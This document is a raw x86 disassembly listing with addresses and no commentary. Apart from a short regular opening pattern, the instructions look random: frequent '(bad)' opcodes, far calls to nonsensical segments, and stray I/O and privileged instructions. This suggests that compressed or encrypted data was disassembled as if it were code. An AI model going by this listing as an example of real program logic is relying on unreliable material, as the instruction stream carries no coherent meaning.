  4222ab:	inc    edx
  4222ac:	add    BYTE PTR [ebp+0x48],cl
  4222af:	inc    edx
  4222b0:	add    BYTE PTR [ecx+0x48],dl
  4222b3:	inc    edx
  4222b4:	add    BYTE PTR [ebp+0x48],dl
  4222b7:	inc    edx
  4222b8:	add    BYTE PTR [ecx+0x48],bl
  4222bb:	inc    edx
  4222bc:	add    BYTE PTR [ebp+0x48],bl
  4222bf:	inc    edx
  4222c0:	add    BYTE PTR [ecx+0x48],ah
  4222c3:	inc    edx
  4222c4:	add    BYTE PTR [ebp+0x48],ah
  4222c7:	inc    edx
  4222c8:	add    BYTE PTR [ebp-0x29],dl
  4222cb:	mov    edx,0x7defba87
  4222d0:	xlat   BYTE PTR ds:[ebx]
  4222d1:	lea    esp,[esi+edx*4+0x6a]
  4222d5:	int3   
  4222d6:	xor    DWORD PTR [ebx+0x54],ebx
  4222d9:	sbb    ecx,DWORD PTR [ecx+eax*1]
  4222dc:	add    BYTE PTR [eax],ah
  4222de:	pop    es
  4222df:	add    BYTE PTR [eax],al
  4222e1:	dec    esi
  4222e2:	fs and al,0x39
  4222e5:	data16 cmp al,0xd8
  4222e8:	test   BYTE PTR [edi-0x19e564db],bl
  4222ee:	push   esp
  4222ef:	int    0x1a
  4222f1:	mov    eax,0x7f4cbaf1
  4222f6:	lahf   
  4222f7:	enter  0xb46,0xb
  4222fb:	into   
  4222fc:	or     esp,DWORD PTR [edx]
  4222fe:	mov    eax,DWORD PTR [ecx]
  422300:	sbb    eax,0xac1c85a0
  422305:	enter  0xd711,0xb8
  422309:	cli    
  42230a:	mov    ebx,0x851968b6
  42230f:	mov    dl,0x64
  422311:	jmp    0x8a6e512b
  422316:	sub    al,0x3c
  422318:	nop
  422319:	push   ss
  42231a:	xchg   DWORD PTR [edi-0x11ced33f],esi
  422320:	ss jb  0x42230a
  422323:	lods   al,BYTE PTR ds:[esi]
  422324:	(bad)  
  422325:	stos   BYTE PTR es:[edi],al
  422326:	dec    ecx
  422327:	je     0x422367
  422329:	pop    ds
  42232a:	ficomp WORD PTR [ecx-0x4aafdeb5]
  422330:	and    eax,0xf9c3a64c
  422335:	cmp    cl,BYTE PTR [eax-0x741531a9]
  42233b:	jno    0x42236c
  42233d:	mov    BYTE PTR [ebp+0x15],bl
  422340:	xchg   edi,edi
  422342:	xor    ebx,edi
  422344:	xchg   ebx,eax
  422345:	enter  0xc225,0x25
  422349:	pushf  
  42234a:	xchg   esp,eax
  42234b:	loope  0x4222e3
  42234d:	int    0x6c
  42234f:	pop    edx
  422350:	mov    ecx,0x2870109c
  422355:	xchg   ch,ah
  422357:	test   BYTE PTR [ecx],dl
  422359:	xor    edx,DWORD PTR [ebp-0x59]
  42235c:	(bad)  
  42235d:	scas   eax,DWORD PTR es:[edi]
  42235e:	push   ss
  42235f:	adc    BYTE PTR [eax+0x1c],dh
  422362:	jecxz  0x4223a3
  422364:	adc    BYTE PTR [eax+0xe41424c],dl
  42236a:	fistp  DWORD PTR ds:0xd4757784
  422370:	cli    
  422371:	xchg   esi,eax
  422372:	rol    BYTE PTR [ebx+ebp*1],1
  422375:	mov    esi,0x824fa88e
  42237a:	(bad)  
  42237b:	mov    ecx,0xda831e86
  422380:	push   ebx
  422381:	mov    edx,0x12e8d6ca
  422386:	and    eax,DWORD PTR [ebp+0x1a]
  422389:	or     esi,DWORD PTR [edi+0x1b4e0c98]
  42238f:	(bad)  
  422390:	aad    0x6b
  422392:	pop    eax
  422393:	or     dh,BYTE PTR [ebp+eax*8+0xa32590b]
  42239a:	test   eax,0x17214ff4
  42239f:	jle    0x42241f
  4223a1:	loope  0x422346
  4223a3:	fild   DWORD PTR [eax+0x3e41445d]
  4223a9:	call   0x98f4133b
  4223ae:	cmc    
  4223af:	cmp    al,0x9e
  4223b1:	imul   ebx,ebp,0xaf5ff19a
  4223b7:	adc    al,0xad
  4223ba:	sbb    al,BYTE PTR [eax]
  4223bc:	mov    al,ds:0xcce4df6c
  4223c1:	lock xor esp,DWORD PTR [edx-0x5]
  4223c5:	mov    ds:0xa39adbb,eax
  4223ca:	jae    0x422434
  4223cc:	inc    esi
  4223cd:	inc    eax
  4223ce:	lea    eax,[edx-0x55]
  4223d1:	mov    edi,0x8c83dd14
  4223d6:	push   0x11bd1a9
  4223db:	popf   
  4223dc:	jge    0x422372
  4223de:	mov    ebx,0x1911f3d7
  4223e3:	push   cs
  4223e4:	retf   0x6bae
  4223e7:	jnp    0x422369
  4223e9:	in     al,dx
  4223ea:	bound  ecx,QWORD PTR [edi+0x3c042131]
  4223f0:	inc    edx
  4223f1:	add    BYTE PTR [edx-0x42],al
  4223f4:	loop   0x422411
  4223f6:	gs daa 
  4223f8:	lock mov ebx,gs
  4223fb:	imul   ecx,ebx,0xffffffd5
  4223fe:	sub    al,0x96
  422400:	add    BYTE PTR [edx],cl
  422402:	in     al,dx
  422403:	cmp    ah,BYTE PTR gs:[ebx+0x52db4324]
  42240a:	sbb    eax,0xd4e85fda
  42240f:	push   edi
  422410:	mov    bp,0xdfe4
  422414:	hlt    
  422415:	mov    bl,bl
  422417:	mov    ah,0x1e
  422419:	pop    edx
  42241a:	icebp  
  42241b:	mov    dl,0xb
  42241d:	pop    ss
  42241e:	or     al,0xfb
  422420:	pushf  
  422421:	or     al,0xff
  422423:	je     0x422429
  422425:	std    
  422426:	iret   
  422427:	xor    DWORD PTR [ebp+0x22588ce6],esi
  42242d:	mov    ch,0xb7
  42242f:	mov    esp,0xa4532486
  422434:	push   esi
  422435:	cmp    ah,BYTE PTR [ecx+0x604c2698]
  42243b:	push   es
  42243c:	loop   0x422454
  42243e:	adc    BYTE PTR [ebx-0x6b9890aa],0x56
  422445:	andnps xmm4,xmm1
  422448:	dec    edi
  422449:	pop    ebp
  42244a:	stc    
  42244b:	in     eax,0x9a
  42244d:	and    dl,BYTE PTR [ecx-0x30]
  422450:	pop    edx
  422451:	gs ret 
  422453:	(bad)  
  422454:	fisttp DWORD PTR [edi]
  422456:	hlt    
  422457:	sub    eax,0x843b7a54
  42245c:	sub    ebp,edi
  42245e:	pop    es
  42245f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422460:	jb     0x42245e
  422462:	pop    esi
  422463:	pop    eax
  422464:	jbe    0x422425
  422466:	aad    0xa0
  422468:	fwait
  422469:	dec    ecx
  42246a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42246b:	fdiv   DWORD PTR [ecx+0x5e]
  42246e:	scas   al,BYTE PTR es:[edi]
  42246f:	pop    ss
  422470:	xchg   ebp,ebx
  422472:	mov    ecx,0x893918b5
  422477:	xchg   ebx,eax
  422478:	push   edx
  422479:	shl    BYTE PTR [edx],0xb
  42247c:	and    edx,edi
  42247e:	call   0xd7e3:0x8b43795
  422485:	fisub  WORD PTR [ebx+ebx*8]
  422488:	sub    ch,BYTE PTR fs:[ebp-0x11e80c1a]
  42248f:	add    al,0x54
  422491:	jp     0x42249d
  422493:	sbb    DWORD PTR [ebx-0x3d],0x31875084
  42249a:	in     eax,0xf6
  42249c:	in     al,dx
  42249d:	mov    eax,0x64e11a13
  4224a2:	mov    eax,es
  4224a4:	loope  0x422439
  4224a6:	ret    
  4224a7:	add    ebp,DWORD PTR [ebp+0x55]
  4224aa:	loopne 0x42246d
  4224ac:	(bad)  
  4224ad:	and    eax,0xb2727f60
  4224b2:	mov    ds:0x7b356c67,al
  4224b7:	dec    esp
  4224b8:	xlat   BYTE PTR ds:[ebx]
  4224b9:	sub    BYTE PTR [esi-0x73],cl
  4224bc:	inc    ebx
  4224bd:	adc    bl,BYTE PTR [esi+0x7df19ac6]
  4224c3:	dec    edx
  4224c4:	jnp    0x4224b4
  4224c6:	(bad)  
  4224c7:	or     eax,0x548570fd
  4224cc:	pusha  
  4224cd:	dec    esp
  4224ce:	aas    
  4224cf:	adc    BYTE PTR [esi+0xe],cl
  4224d2:	sbb    dl,BYTE PTR [eax+0x29649a09]
  4224d8:	and    al,0x68
  4224da:	ffree  st(7)
  4224dc:	ss loope 0x4224e0
  4224df:	call   0xb6fd:0xe9cf5fd2
  4224e6:	jp     0x4224b5
  4224e8:	call   0x35ab:0xc44d981c
  4224ef:	xchg   edx,eax
  4224f0:	popf   
  4224f1:	mov    eax,0x7d157cc
  4224f6:	(bad)  
  4224f7:	dec    ebx
  4224f8:	pop    esi
  4224f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224fa:	jg     0x39ef5d6a
  422500:	inc    ecx
  422501:	sbb    eax,0x15b64a59
  422506:	mov    ch,0x80
  422508:	ins    BYTE PTR es:[edi],dx
  422509:	mov    eax,0xa7e23c93
  42250e:	jge    0x4224bf
  422510:	aam    0xf1
  422512:	jmp    0x8477:0x6fe30af1
  422519:	into   
  42251a:	adc    eax,0x81048ef6
  42251f:	mov    ah,0x82
  422521:	and    BYTE PTR [ebx+0x5c05feb6],dl
  422527:	dec    ebx
  422528:	js     0x4224ad
  42252a:	xor    al,0xc4
  42252c:	arpl   WORD PTR [ecx+ebp*4-0x36b694b0],di
  422533:	pop    edx
  422534:	jp     0x422575
  422536:	jmp    0x4225a3
  422538:	mov    WORD PTR [esi-0x7e3d50aa],fs
  42253e:	lods   eax,DWORD PTR ds:[esi]
  42253f:	int3   
  422540:	dec    esp
  422541:	das    
  422542:	les    eax,FWORD PTR [edi+0x3d]
  422545:	mov    WORD PTR [edi],cs
  422547:	repz sub DWORD PTR ds:0xc99e9c75,esi
  42254e:	or     BYTE PTR [ebp+0x4329c796],0x3
  422555:	sbb    al,0xcc
  422557:	retf   0xecbf
  42255a:	test   eax,0x43c0948b
  42255f:	in     eax,0x2b
  422561:	dec    edi
  422562:	sub    DWORD PTR [edx+edi*2+0x47],0x6f
  422567:	lods   eax,DWORD PTR ds:[esi]
  422568:	pop    ebx
  422569:	outs   dx,BYTE PTR ds:[esi]
  42256a:	xor    bl,BYTE PTR [edx]
  42256c:	mov    edx,0x4a6af687
  422571:	lods   eax,DWORD PTR ds:[esi]
  422572:	mov    ebp,0xa6397002
  422577:	adc    DWORD PTR [edi+0x1b],eax
  42257a:	push   ecx
  42257b:	daa    
  42257c:	arpl   dx,sp
  42257e:	int3   
  42257f:	shr    BYTE PTR [edi-0x12],0x11
  422583:	inc    ebp
  422584:	fcmovne st,st(5)
  422586:	push   esi
  422587:	(bad)  
  422589:	repnz mov bl,0xe9
  42258c:	add    ah,bl
  42258e:	inc    eax
  42258f:	xchg   WORD PTR [ebx],cx
  422592:	(bad)  
  422594:	push   edx
  422595:	sub    cl,dh
  422597:	fwait
  422598:	mov    eax,0x8ec5d40c
  42259d:	dec    ecx
  42259e:	pop    esi
  42259f:	test   eax,0x77a78fd3
  4225a4:	pop    ebx
  4225a5:	xchg   edx,eax
  4225a6:	fs je  0x42254e
  4225a9:	pusha  
  4225aa:	fwait
  4225ab:	xchg   ebp,eax
  4225ac:	ficomp DWORD PTR [esi-0x1f7c099a]
  4225b2:	popa   
  4225b3:	inc    ebp
  4225b4:	xor    edx,ebp
  4225b6:	lds    eax,FWORD PTR [edx+ecx*4+0x5ab5d4e5]
  4225bd:	and    BYTE PTR [ebx],dl
  4225bf:	xor    esp,eax
  4225c1:	mov    al,0xba
  4225c3:	lds    eax,FWORD PTR [edx+0x54df46cc]
  4225c9:	cmp    eax,0x572d65d
  4225ce:	(bad)  
  4225cf:	rcl    ah,1
  4225d1:	sub    eax,DWORD PTR [edi]
  4225d3:	or     DWORD PTR [ecx],edx
  4225d5:	sti    
  4225d6:	ret    
  4225d7:	vsubss xmm7,xmm5,xmm6
  4225db:	loopne 0x422598
  4225dd:	mov    ds:0x77766fc7,eax
  4225e2:	fbld   TBYTE PTR [edx+0x32]
  4225e5:	in     al,0x6f
  4225e7:	fstp   DWORD PTR [edi]
  4225e9:	cmp    eax,0x9b7df407
  4225ee:	mov    WORD PTR [esi-0x1c17d1d8],?
  4225f4:	adc    ebp,eax
  4225f6:	les    ebx,FWORD PTR [ecx-0x54c0b945]
  4225fc:	aaa    
  4225fd:	jmp    0x6f317a6c
  422602:	push   cs
  422603:	ret    
  422604:	mov    al,ds:0xaf473aca
  422609:	xchg   esi,eax
  42260a:	test   BYTE PTR [esi],bh
  42260c:	pop    esi
  42260d:	call   0x2475:0x3ce1abae
  422614:	sbb    ebx,edi
  422616:	pop    es
  422617:	lds    ecx,FWORD PTR [eax]
  422619:	adc    BYTE PTR [ebx],cl
  42261b:	enter  0xd0c8,0x31
  42261f:	stos   BYTE PTR es:[edi],al
  422620:	dec    edi
  422621:	leave  
  422622:	or     ax,0x7de4
  422626:	add    DWORD PTR [ebx],0x9eb2e0b8
  42262c:	xchg   esp,eax
  42262d:	sub    dl,ch
  42262f:	(bad)  
  422630:	ret    0x2e06
  422633:	ja     0x422667
  422635:	or     BYTE PTR [ebp+0x4],0x43
  422639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42263a:	mov    al,BYTE PTR [ebx+0x32bdc514]
  422640:	lods   al,BYTE PTR ds:[esi]
  422641:	cs mov ebp,0xa6cad5e8
  422647:	out    dx,al
  422648:	cmp    DWORD PTR [ebp+0x56],ecx
  42264b:	shl    BYTE PTR [ebx+edx*8-0x1cb69f05],cl
  422652:	push   edi
  422653:	jbe    0x422604
  422655:	xchg   edi,edx
  422657:	mov    WORD PTR [esi+0x75],?
  42265a:	cmp    DWORD PTR [esi-0xe],0xffffff84
  42265e:	adc    al,0xce
  422660:	xchg   ebx,eax
  422661:	inc    ecx
  422662:	int    0xb2
  422664:	shl    BYTE PTR [edi-0x3c95aa46],cl
  42266a:	jmp    0x805c:0x1a50477b
  422671:	dec    ebx
  422672:	hlt    
  422673:	xchg   DWORD PTR [edi-0x5c3170b4],esp
  422679:	push   ds
  42267a:	xor    al,0x5
  42267c:	sub    al,0xad
  42267e:	arpl   dx,cx
  422680:	les    edi,FWORD PTR es:[ebx+edx*1-0xc7d1e8c]
  422688:	outs   dx,BYTE PTR ds:[esi]
  422689:	xchg   edx,eax
  42268a:	jmp    0x4226db
  42268c:	in     al,dx
  42268d:	fld    DWORD PTR [ebx+0x658c0e4a]
  422693:	ret    
  422694:	in     eax,0xc5
  422696:	psrlq  mm4,QWORD PTR [edx-0x3a]
  42269a:	in     al,0x1c
  42269c:	mov    ?,WORD PTR [ebp+eiz*8+0x3a]
  4226a0:	in     al,0x7c
  4226a2:	sahf   
  4226a3:	mov    cr7,edi
  4226a6:	mov    ds:0x23fb51ff,al
  4226ab:	dec    edi
  4226ac:	nop
  4226ad:	mov    eax,DWORD PTR [ebx+0xf]
  4226b0:	pop    ebp
  4226b1:	or     ecx,ecx
  4226b3:	(bad)  
  4226b4:	xchg   edx,eax
  4226b5:	xlat   BYTE PTR ds:[ebx]
  4226b6:	lock ret 
  4226b8:	pop    esp
  4226b9:	sbb    ecx,DWORD PTR es:[eax+0x4a]
  4226bd:	retf   
  4226be:	add    DWORD PTR [ebx],ebx
  4226c0:	in     al,0x8c
  4226c2:	cmp    BYTE PTR [edi+0x2cca65ec],dl
  4226c8:	iret   
  4226c9:	push   eax
  4226ca:	adc    eax,0x5f71ffc0
  4226cf:	and    al,0xea
  4226d1:	or     DWORD PTR [esi],eax
  4226d3:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226d5:	fs jge 0x4226f8
  4226d8:	jmp    DWORD PTR [ecx]
  4226da:	cmp    dh,al
  4226dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226dd:	repnz mov ch,BYTE PTR [esi]
  4226e0:	pop    ebx
  4226e1:	and    ah,ch
  4226e3:	push   0xffffff83
  4226e5:	stos   DWORD PTR es:[edi],eax
  4226e6:	pop    eax
  4226e7:	sahf   
  4226e8:	adc    eax,0xba6df4f2
  4226ed:	sahf   
  4226ee:	clc    
  4226ef:	in     eax,0x33
  4226f1:	inc    di
  4226f3:	and    DWORD PTR [edi-0x403d6d1b],0xffffffa8
  4226fa:	pop    ebp
  4226fb:	push   0x1d
  4226fd:	add    dl,BYTE PTR [ebx-0x7c]
  422700:	adc    BYTE PTR [edx-0x47],0x11
  422704:	call   0x2cf6:0xe195dd50
  42270b:	call   0xf34c:0x10379820
  422712:	fucom  st(1)
  422714:	mov    esp,0x68d87345
  422719:	or     DWORD PTR gs:[ebp+0x2c85e036],esi
  422720:	sub    bh,BYTE PTR [ebp+0x7a1d550]
  422726:	or     DWORD PTR [esi-0x23],ecx
  422729:	out    dx,al
  42272a:	daa    
  42272b:	daa    
  42272c:	xchg   ebx,eax
  42272d:	fidiv  DWORD PTR [ecx+edx*1+0xc]
  422731:	mov    BYTE PTR [ebp-0x6e023fe1],bh
  422737:	cdq    
  422738:	push   esi
  422739:	xor    DWORD PTR [edi+0x4004bcde],ecx
  42273f:	sbb    edi,ecx
  422741:	mov    dl,0xb3
  422743:	sahf   
  422744:	scas   al,BYTE PTR es:[edi]
  422745:	pop    es
  422746:	aaa    
  422747:	fisubr DWORD PTR [eax-0x6a]
  42274a:	sub    al,0x13
  42274c:	nop
  42274d:	or     BYTE PTR [ecx-0x3b],cl
  422750:	imul   edx,DWORD PTR [esi+0x11],0xffffff9b
  422754:	sti    
  422755:	mov    ch,0x8c
  422757:	daa    
  422758:	fdiv   st,st(0)
  42275a:	test   eax,0x9208298e
  42275f:	sub    al,0x4a
  422761:	push   ebx
  422762:	fadd   st,st(3)
  422764:	(bad)  
  422767:	enter  0xb079,0xf1
  42276b:	xchg   ebx,eax
  42276c:	nop
  42276d:	invd   
  42276f:	fisub  DWORD PTR [edi-0x7c]
  422772:	(bad)  
  422773:	shr    DWORD PTR [edx],1
  422775:	and    BYTE PTR [ebx-0x41],0xa
  422779:	scas   al,BYTE PTR es:[edi]
  42277a:	fistp  WORD PTR [ebx]
  42277c:	sub    DWORD PTR [edi],0x97aa53df
  422782:	stos   BYTE PTR es:[edi],al
  422783:	aad    0x89
  422785:	das    
  422786:	or     dh,BYTE PTR [ecx-0x60]
  422789:	imul   eax,eax,0xffffff84
  42278c:	cld    
  42278d:	xchg   edx,eax
  42278e:	xchg   ecx,eax
  42278f:	jle    0x422773
  422791:	sbb    al,0xd8
  422793:	mov    ds:0x36eb2d9f,al
  422798:	cmp    eax,0x1609b111
  42279d:	jmp    0x7406:0xf1df558d
  4227a4:	sbb    dl,BYTE PTR [esi]
  4227a6:	nop
  4227a7:	pop    esi
  4227a8:	popw   es
  4227aa:	std    
  4227ab:	sub    BYTE PTR [edi+ebx*2],dl
  4227ae:	sahf   
  4227af:	push   esp
  4227b0:	arpl   WORD PTR [edx-0xf80864e],si
  4227b6:	inc    ecx
  4227b7:	lock test edi,0xc9a9621f
  4227be:	push   eax
  4227bf:	add    edi,esp
  4227c1:	pusha  
  4227c2:	cs adc edi,esi
  4227c5:	cmp    BYTE PTR [ebx-0x49e5590d],al
  4227cb:	inc    esp
  4227cc:	gs push ss
  4227ce:	jae    0x42282c
  4227d0:	inc    ecx
  4227d1:	add    al,0xd7
  4227d3:	push   edx
  4227d4:	sub    BYTE PTR [edx],bl
  4227d6:	adc    DWORD PTR [ebp+0x26f266c2],edi
  4227dc:	retf   
  4227dd:	sbb    BYTE PTR [edx+edx*1],dh
  4227e0:	mov    dl,0x10
  4227e2:	sbb    esi,esp
  4227e4:	or     bl,ch
  4227e6:	push   edx
  4227e7:	dec    ecx
  4227e8:	mov    ecx,0xb5ebf70
  4227ed:	loop   0x4227b0
  4227ef:	or     ch,BYTE PTR [edx-0x745347d5]
  4227f5:	aaa    
  4227f6:	fabs   
  4227f8:	mov    edi,0xfcf0d63d
  4227fd:	ror    BYTE PTR [ecx+eax*4-0x72],cl
  422801:	mov    dh,0x4a
  422803:	ror    DWORD PTR [ebx-0x6e],1
  422806:	dec    esp
  422807:	push   esi
  422808:	cli    
  422809:	in     al,dx
  42280a:	je     0xa097291b
  422810:	add    ebp,DWORD PTR [esi+0x30]
  422813:	push   ss
  422814:	xor    dh,ch
  422816:	lods   eax,DWORD PTR ds:[esi]
  422817:	add    DWORD PTR [esi-0x2e7e284b],0x5e
  42281e:	out    dx,al
  42281f:	pop    edi
  422820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422821:	mov    ebx,0x330520d6
  422826:	sahf   
  422827:	xor    eax,0xb9ea716
  42282c:	push   edi
  42282d:	dec    edi
  42282e:	rcl    DWORD PTR [edi],1
  422830:	push   ecx
  422831:	xlat   BYTE PTR ds:[ebx]
  422832:	mov    ch,0xda
  422834:	stos   DWORD PTR es:[edi],eax
  422835:	add    BYTE PTR [edx-0x4c],al
  422838:	push   cs
  422839:	fwait
  42283a:	adc    BYTE PTR [esi+0x22],ah
  42283d:	mov    fs,WORD PTR [ecx-0x4e]
  422840:	imul   eax,DWORD PTR [ecx],0xe6b4a4a7
  422846:	sub    esi,DWORD PTR [esi+eiz*1]
  422849:	mov    edx,0xa268e302
  42284e:	push   ecx
  42284f:	xchg   ebp,eax
  422850:	sar    ah,1
  422852:	add    ecx,DWORD PTR [esi+0x52]
  422855:	or     DWORD PTR [edx+0x3abea9a8],edx
  42285b:	repz xchg edi,eax
  42285d:	inc    eax
  42285e:	dec    ebp
  42285f:	out    0x6,eax
  422861:	cld    
  422862:	xlat   BYTE PTR ds:[ebx]
  422863:	dec    ebx
  422864:	std    
  422865:	(bad)  
  422866:	dec    edi
  422867:	std    
  422868:	mov    ebp,0x961c82a8
  42286d:	mov    WORD PTR [eax+0x41f4580b],?
  422873:	div    dl
  422875:	lods   al,BYTE PTR ds:[esi]
  422876:	xchg   ebx,eax
  422877:	adc    BYTE PTR [esi+0x5],dl
  42287a:	cwde   
  42287b:	jb     0x422834
  42287d:	cwde   
  42287e:	push   ss
  42287f:	dec    esi
  422880:	test   eax,0x364de72
  422885:	loope  0x422859
  422887:	xchg   ebp,eax
  422888:	push   ebx
  422889:	bound  esp,QWORD PTR [eax]
  42288b:	in     al,dx
  42288c:	jbe    0x42287f
  42288e:	test   BYTE PTR [edx],bh
  422890:	sbb    BYTE PTR [edx*1-0x11dca5e0],cl
  422897:	mov    bl,ah
  422899:	cli    
  42289a:	xchg   ecx,eax
  42289b:	xor    al,0xca
  42289d:	imul   ecx,DWORD PTR [ecx-0x11],0xffffffed
  4228a1:	xor    bh,cl
  4228a3:	popa   
  4228a4:	mov    ecx,0xc4da3136
  4228a9:	inc    ebp
  4228aa:	dec    edi
  4228ab:	adc    esp,ebx
  4228ad:	cmp    eax,0x18e76db6
  4228b2:	or     DWORD PTR [edi+0x2add8938],0xffffff94
  4228b9:	aam    0xcc
  4228bb:	popf   
  4228bc:	fsub   QWORD PTR [edx+ebx*4]
  4228bf:	out    dx,al
  4228c0:	push   edi
  4228c1:	(bad)  
  4228c2:	sahf   
  4228c3:	mov    ch,0x73
  4228c5:	ins    DWORD PTR es:[edi],dx
  4228c6:	cmp    eax,0x7d789832
  4228cb:	dec    esp
  4228cc:	xchg   esi,eax
  4228cd:	pusha  
  4228ce:	shl    DWORD PTR [ebp+ebx*2-0x43],cl
  4228d2:	inc    esi
  4228d3:	or     ah,0xbc
  4228d6:	div    edi
  4228d8:	cmp    esi,ebp
  4228da:	retf   
  4228db:	jno    0x42287e
  4228dd:	cs push cs
  4228df:	inc    edi
  4228e0:	outs   dx,BYTE PTR ds:[esi]
  4228e1:	sub    al,0x2
  4228e3:	xor    BYTE PTR [esi+0x2844c3c8],bh
  4228e9:	lods   al,BYTE PTR ds:[esi]
  4228ea:	mov    BYTE PTR [ecx],dh
  4228ec:	lahf   
  4228ed:	rcl    BYTE PTR [edi+0xe02a832],1
  4228f3:	imul   edi,edx,0xff5a488a
  4228f9:	iret   
  4228fa:	rol    edx,0x40
  4228fd:	stos   DWORD PTR es:[edi],eax
  4228fe:	inc    eax
  4228ff:	pop    ebx
  422900:	in     eax,0x72
  422902:	dec    esi
  422903:	sub    DWORD PTR [ebx],edx
  422905:	push   esi
  422906:	fldz   
  422908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422909:	loop   0x422901
  42290b:	cld    
  42290c:	pop    esp
  42290d:	push   eax
  42290e:	pop    ecx
  42290f:	cmp    ecx,DWORD PTR [edi]
  422911:	imul   edx,DWORD PTR [ebx],0xfffffff6
  422914:	loopne 0x4228cf
  422916:	mov    edi,0xebbcb2a9
  42291b:	jge    0x422905
  42291d:	adc    al,0xd7
  42291f:	test   eax,0x5248467c
  422924:	dec    esi
  422925:	and    ch,bh
  422927:	xchg   edi,eax
  422928:	fbstp  TBYTE PTR [esi]
  42292a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42292b:	sbb    DWORD PTR ds:[ebx+0x44a149bf],edi
  422932:	dec    edx
  422933:	adc    BYTE PTR [esi+0x5c64508a],al
  422939:	cmp    esp,ecx
  42293b:	mov    al,ds:0x2d8724df
  422940:	in     eax,0xa0
  422942:	and    eax,0x583f838c
  422947:	push   edi
  422948:	mov    dh,0x6d
  42294a:	in     eax,dx
  42294b:	dec    esp
  42294c:	cmc    
  42294d:	popa   
  42294e:	cli    
  42294f:	or     eax,0xc493dbb3
  422954:	jg     0x42298c
  422956:	and    eax,0x50e2ef58
  42295b:	popa   
  42295c:	inc    edx
  42295d:	mov    edi,0xf99295c6
  422962:	jno    0x42298c
  422964:	loopne 0x422956
  422966:	mov    dh,0x1d
  422968:	jae    0x4229a4
  42296a:	stc    
  42296b:	pusha  
  42296c:	jne    0x422958
  42296e:	call   0x28c5:0x71e40981
  422975:	retf   
  422976:	mov    dl,0xd1
  422978:	iret   
  422979:	add    eax,0xfaa9dc13
  42297e:	imul   esp
  422980:	sbb    BYTE PTR [esi-0x1fa29472],dh
  422986:	cmp    eax,0x4280fbaf
  42298b:	inc    ebp
  42298c:	dec    edi
  42298d:	fcmove st,st(3)
  42298f:	lods   eax,DWORD PTR ds:[esi]
  422990:	push   es
  422991:	js     0x422954
  422993:	fisubr WORD PTR [edx+0x32]
  422996:	xchg   edi,eax
  422997:	adc    DWORD PTR [ecx+0x33],esi
  42299a:	or     eax,DWORD PTR [esi]
  42299c:	rcl    DWORD PTR [edx-0x65],cl
  42299f:	inc    esp
  4229a0:	ret    0xd80f
  4229a3:	jp     0x422a13
  4229a5:	xor    bh,0x2f
  4229a8:	test   BYTE PTR [edi+0x5a14c01b],dh
  4229ae:	inc    ebp
  4229af:	jns    0x4229f3
  4229b1:	(bad)  
  4229b2:	in     al,0xd1
  4229b4:	mov    edx,0xa3c85b05
  4229b9:	or     DWORD PTR [edi+esi*1],edx
  4229bc:	or     ebp,DWORD PTR [edi]
  4229be:	pop    ecx
  4229bf:	(bad)
  4229c2:	cwde   
  4229c3:	iret   
  4229c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229c5:	test   al,0x17
  4229c7:	inc    esp
  4229c8:	add    al,0x2e
  4229ca:	mov    cl,0x67
  4229cc:	or     eax,0xb5bb5f74
  4229d1:	fsub   st,st(3)
  4229d3:	sub    DWORD PTR [edx-0x6ebd1e0d],0xffffffb7
  4229da:	jg     0x422962
  4229dc:	adc    dh,BYTE PTR [edi-0x7f942bb3]
  4229e2:	js     0x422a36
  4229e4:	inc    ecx
  4229e5:	sbb    BYTE PTR [edx],ah
  4229e7:	xor    BYTE PTR [ebx+0x15015066],al
  4229ed:	xchg   ebx,eax
  4229ee:	je     0x4229fc
  4229f0:	jmp    0xa17f:0x5334d447
  4229f7:	test   eax,0xe5881ce9
  4229fc:	add    al,0xf
  4229fe:	add    DWORD PTR [edx-0x4e],ebp
	...
  422a49:	adc    eax,0xfe3de0ab
  422a4e:	jg     0x422a2d
  422a50:	stos   DWORD PTR es:[edi],eax
  422a51:	mov    esi,DWORD PTR [edi-0x5d4a2fe5]
  422a57:	retf   
  422a58:	mov    eax,ds:0x1133b
  422a5d:	and    BYTE PTR [edi],al
  422a5f:	add    BYTE PTR [eax],al
  422a61:	jb     0x422a5d
  422a63:	mov    ds:0x75a74ded,al
  422a68:	nop
  422a69:	mov    WORD PTR [ecx],?
  422a6b:	cmc    
  422a6c:	in     eax,dx
  422a6d:	mov    eax,ds:0x1c52f8a1
  422a72:	out    0x47,al
  422a74:	out    0x81,al
  422a76:	sahf   
  422a77:	or     al,0x79
  422a79:	sub    ah,ah
  422a7b:	pop    esp
  422a7c:	xor    esp,edi
  422a7e:	dec    eax
  422a7f:	enter  0x5e3e,0x37
  422a83:	xchg   ebx,eax
  422a84:	push   0x3f
  422a86:	imul   edx,DWORD PTR [ebx]
  422a89:	mov    edx,0x3c442fb2
  422a8e:	dec    esi
  422a8f:	mov    eax,0xcbf59a28
  422a94:	inc    esp
  422a95:	fmul   st,st(1)
  422a97:	call   0x822928c1
  422a9c:	push   cs
  422a9d:	mov    bh,0x67
  422a9f:	cmp    bh,BYTE PTR [edi]
  422aa1:	pop    ss
  422aa2:	add    BYTE PTR [eax-0x48ba2863],bh
  422aa8:	or     edi,esi
  422aaa:	and    al,0xd5
  422aac:	cmp    BYTE PTR [esi-0x14],bl
  422aaf:	sbb    bh,BYTE PTR [ebp-0x42]
  422ab2:	or     eax,0x2cd17ff6
  422ab7:	ds (bad) 
  422ab9:	fcomp  DWORD PTR [edx+0x34979cf7]
  422abf:	cmp    DWORD PTR [esi-0x1d713997],ebx
  422ac5:	(bad)  [ebx+0x7617ba0d]
  422acb:	pop    edi
  422acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422acd:	jo     0x422ab4
  422acf:	mov    ebx,0x4ee54be0
  422ad4:	call   0x7b96aaa
  422ad9:	dec    esi
  422ada:	or     DWORD PTR [edx+ecx*1-0x5f],esp
  422ade:	jbe    0x422af7
  422ae0:	loope  0x422b3d
  422ae2:	pop    eax
  422ae3:	push   ss
  422ae4:	push   esp
